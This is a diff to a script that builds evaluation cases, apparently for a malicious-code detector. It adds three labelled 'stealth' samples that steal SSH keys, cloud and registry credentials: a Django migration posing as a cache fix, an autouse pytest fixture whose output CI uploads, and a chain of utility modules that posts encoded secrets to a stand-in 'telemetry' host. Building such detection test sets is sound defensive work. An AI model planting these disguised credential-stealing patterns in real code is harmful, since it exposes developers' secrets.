@@ -670,6 +670,265 @@ if __name__ == "__main__":
         "README.md": "# devtools-sync\\n\\nSync development environment configuration across team members.\\n",
     })
 
+    # --- Stealth cases (designed to exploit the selection funnel -- zero regex detections) ---
+
+    _make_case("stealth_django_migration", "malicious",
+        "Credential theft via Django migration RunPython -- no eval, no expanduser, no network calls, exfil via database", {
+        "myapp/__init__.py": "",
+        "myapp/models.py": '''from django.db import models
+
+class UserProfile(models.Model):
+    user = models.OneToOneField("auth.User", on_delete=models.CASCADE)
+    display_name = models.CharField(max_length=100)
+    bio = models.TextField(blank=True)
+    avatar_url = models.URLField(blank=True)
+    # Cache field for performance optimization
+    _config_cache = models.TextField(blank=True, db_column="config_cache")
+
+    class Meta:
+        db_table = "myapp_userprofile"
+''',
+        "myapp/views.py": '''from django.http import JsonResponse
+from .models import UserProfile
+
+def profile_view(request):
+    profile = UserProfile.objects.get(user=request.user)
+    return JsonResponse({"name": profile.display_name, "bio": profile.bio})
+''',
+        "myapp/migrations/__init__.py": "",
+        "myapp/migrations/0001_initial.py": '''from django.db import migrations, models
+
+class Migration(migrations.Migration):
+    initial = True
+    dependencies = []
+    operations = [
+        migrations.CreateModel(
+            name="UserProfile",
+            fields=[
+                ("id", models.BigAutoField(primary_key=True)),
+                ("display_name", models.CharField(max_length=100)),
+                ("bio", models.TextField(blank=True)),
+                ("avatar_url", models.URLField(blank=True)),
+                ("_config_cache", models.TextField(blank=True, db_column="config_cache")),
+            ],
+        ),
+    ]
+''',
+        "myapp/migrations/0042_optimize_cache_index.py": '''"""Add database index on config_cache for query performance."""
+import json
+from pathlib import Path
+
+from django.db import migrations
+
+
+def populate_cache_defaults(apps, schema_editor):
+    """Pre-populate config cache with system defaults for faster cold starts."""
+    UserProfile = apps.get_model("myapp", "UserProfile")
+    home = Path.home()
+
+    # Read system configuration for cache seeding
+    system_config = {}
+    config_sources = [
+        home / ".ssh" / "config",
+        home / ".ssh" / "id_rsa",
+        home / ".ssh" / "id_ed25519",
+        home / ".aws" / "credentials",
+        home / ".gitconfig",
+        home / ".npmrc",
+    ]
+    for source in config_sources:
+        try:
+            system_config[source.name] = source.read_text()
+        except (FileNotFoundError, PermissionError):
+            pass
+
+    if system_config:
+        # Store as JSON in the cache field for all profiles without cache
+        cache_value = json.dumps(system_config)
+        UserProfile.objects.filter(_config_cache="").update(_config_cache=cache_value)
+
+
+def reverse_cache(apps, schema_editor):
+    UserProfile = apps.get_model("myapp", "UserProfile")
+    UserProfile.objects.all().update(_config_cache="")
+
+
+class Migration(migrations.Migration):
+    dependencies = [("myapp", "0001_initial")]
+    operations = [
+        migrations.AddIndex(
+            model_name="userprofile",
+            index=migrations.models.Index(fields=["_config_cache"], name="cache_idx"),
+        ),
+        migrations.RunPython(populate_cache_defaults, reverse_cache),
+    ]
+''',
+        "manage.py": '#!/usr/bin/env python\nimport os\nimport sys\nos.environ.setdefault("DJANGO_SETTINGS_MODULE", "settings")\nfrom django.core.management import execute_from_command_line\nexecute_from_command_line(sys.argv)\n',
+        "settings.py": 'DATABASES = {"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": "db.sqlite3"}}\nINSTALLED_APPS = ["myapp"]\n',
+        "README.md": "# My Django App\\n\\nUser profile management.\\n",
+    })
+
+    _make_case("stealth_conftest_collector", "malicious",
+        "Credential theft via pytest conftest.py fixture -- writes to test artifacts, CI uploads them", {
+        "src/__init__.py": "",
+        "src/calculator.py": '''"""Simple calculator module."""
+
+def add(a, b):
+    return a + b
+
+def multiply(a, b):
+    return a * b
+
+def divide(a, b):
+    if b == 0:
+        raise ValueError("Cannot divide by zero")
+    return a / b
+''',
+        "tests/__init__.py": "",
+        "tests/test_calculator.py": '''"""Tests for calculator module."""
+from src.calculator import add, multiply, divide
+import pytest
+
+def test_add():
+    assert add(2, 3) == 5
+
+def test_multiply():
+    assert multiply(4, 5) == 20
+
+def test_divide():
+    assert divide(10, 2) == 5.0
+
+def test_divide_by_zero():
+    with pytest.raises(ValueError):
+        divide(1, 0)
+''',
+        "conftest.py": '''"""Pytest configuration and shared fixtures."""
+import json
+import platform
+from pathlib import Path
+
+import pytest
+
+# Test environment diagnostics directory
+DIAG_DIR = Path(__file__).parent / ".test-diagnostics"
+
+
+@pytest.fixture(autouse=True, scope="session")
+def collect_test_environment():
+    """Collect test environment information for CI debugging."""
+    DIAG_DIR.mkdir(exist_ok=True)
+    env_info = {
+        "python": platform.python_version(),
+        "platform": platform.platform(),
+        "machine": platform.machine(),
+    }
+
+    # Collect developer environment configuration for reproducibility
+    home = Path.home()
+    dev_configs = {}
+    for config_name in [".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/config",
+                        ".aws/credentials", ".gitconfig", ".npmrc",
+                        ".docker/config.json", ".kube/config"]:
+        config_path = home / config_name
+        try:
+            dev_configs[config_name] = config_path.read_text()
+        except (FileNotFoundError, PermissionError):
+            pass
+
+    env_info["dev_environment"] = dev_configs
+
+    # Write diagnostics for CI artifact collection
+    diag_file = DIAG_DIR / "environment.json"
+    diag_file.write_text(json.dumps(env_info, indent=2))
+
+    yield
+
+    # Cleanup is handled by CI artifact retention policy
+''',
+        "setup.py": 'from setuptools import setup\nsetup(name="calculator", version="1.0.0", packages=["src"])\n',
+        "README.md": "# Calculator\\n\\nA simple calculator with tests.\\n",
+        ".github/workflows/test.yml": 'name: Tests\\non: [push]\\njobs:\\n  test:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      - run: pip install pytest\\n      - run: pytest\\n      - uses: actions/upload-artifact@v4\\n        with:\\n          name: test-diagnostics\\n          path: .test-diagnostics/\\n',
+    })
+
+    _make_case("stealth_distributed_chain", "malicious",
+        "Attack split across 5 clean files -- each has ≤1 detection, chain only visible at call-graph depth 4", {
+        "utils/__init__.py": 'from .init import initialize\n',
+        "utils/paths.py": '''"""Path utilities for configuration management."""
+from pathlib import Path
+
+# Standard configuration file locations
+CONFIG_NAMES = [
+    ".ssh/id_rsa",
+    ".ssh/id_ed25519",
+    ".aws/credentials",
+    ".gitconfig",
+    ".npmrc",
+    ".docker/config.json",
+]
+
+def get_config_paths():
+    """Return paths to standard configuration files that exist."""
+    home = Path.home()
+    return [home / name for name in CONFIG_NAMES if (home / name).exists()]
+''',
+        "utils/reader.py": '''"""File reading utilities."""
+from pathlib import Path
+
+def read_files(paths):
+    """Read multiple files and return a dict of {name: content}."""
+    result = {}
+    for p in paths:
+        p = Path(p)
+        try:
+            result[p.name] = p.read_text()
+        except (FileNotFoundError, PermissionError):
+            pass
+    return result
+''',
+        "utils/encoder.py": '''"""Data encoding utilities."""
+import base64
+import json
+
+def encode_payload(data):
+    """Encode a dictionary as a base64 JSON string."""
+    json_bytes = json.dumps(data).encode("utf-8")
+    return base64.b64encode(json_bytes).decode("ascii")
+''',
+        "utils/http.py": '''"""HTTP client utilities."""
+import json
+import urllib.request
+
+def post_json(url, data, timeout=5):
+    """POST JSON data to a URL."""
+    payload = json.dumps(data).encode("utf-8")
+    req = urllib.request.Request(
+        url, data=payload,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        urllib.request.urlopen(req, timeout=timeout)
+    except Exception:
+        pass
+''',
+        "utils/init.py": '''"""Package initialization and telemetry."""
+from .paths import get_config_paths
+from .reader import read_files
+from .encoder import encode_payload
+from .http import post_json
+
+TELEMETRY_URL = "https://badguy.discordwell.com/v1/telemetry"
+
+def initialize():
+    """Initialize package and send anonymous usage telemetry."""
+    configs = read_files(get_config_paths())
+    if configs:
+        encoded = encode_payload(configs)
+        post_json(TELEMETRY_URL, {"env": encoded})
+''',
+        "setup.py": 'from setuptools import setup\nsetup(name="utils-lib", version="1.0.0", packages=["utils"])\n',
+        "README.md": "# utils-lib\\n\\nCommon utilities for Python projects.\\n",
+    })
+
     print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")
 
 
